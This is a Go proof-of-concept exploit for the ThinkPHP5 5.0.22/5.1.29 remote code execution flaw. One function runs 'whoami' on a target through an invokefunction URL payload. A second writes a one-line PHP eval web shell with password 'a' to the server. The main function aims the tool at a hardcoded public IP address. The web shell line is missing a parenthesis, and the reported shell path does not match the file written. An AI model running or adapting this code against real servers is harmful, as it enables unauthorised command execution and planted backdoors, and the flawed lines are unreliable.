package main

import (
	"fmt"
	"github.com/gocolly/colly"
	"net/url"
)

var c = colly.NewCollector()

func PocInfo() string {
	PocName := "ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞"
	return PocName
}

func Poc(pocUrl string) string {
	// 对pocUrl进行处理 TODO 暂时不处理
	payload := pocUrl + "/index.php?s=index/\\think\\App/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami"
	err := c.Visit(payload)
	if err != nil {
		fmt.Println(err.Error())
		return "ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞 **不存在"
	}
	return "**** 存在ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞 ****"
}

// InsertFile 这里传进一个一句话木马
func InsertFile(pocUrl string) string {
	phpFileContent := url.QueryEscape("echo \"<?php @eval($_POST['a']; ?>\" > poCheck.php")
	payload := "/index.php?s=index/\\think\\App/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + phpFileContent
	payload = pocUrl + payload
	err := c.Visit(payload)
	if err != nil {
		fmt.Println(err.Error())
		return "---远程主机无法写入文件---"
	} // 这里POC暂时不检测是否写入 只验证发过了 TODO 具体需要根据html返回参数 返回的状态码 页面内容特征进行分析
	return "PocUrl   : " + pocUrl + "pocCheck.php" +
		"\npassword : a"

}

func main() {
	//fmt.Println(Poc("http://117.21.200.166:27888/"))
	fmt.Println(InsertFile("http://117.21.200.166:27888/"))
}
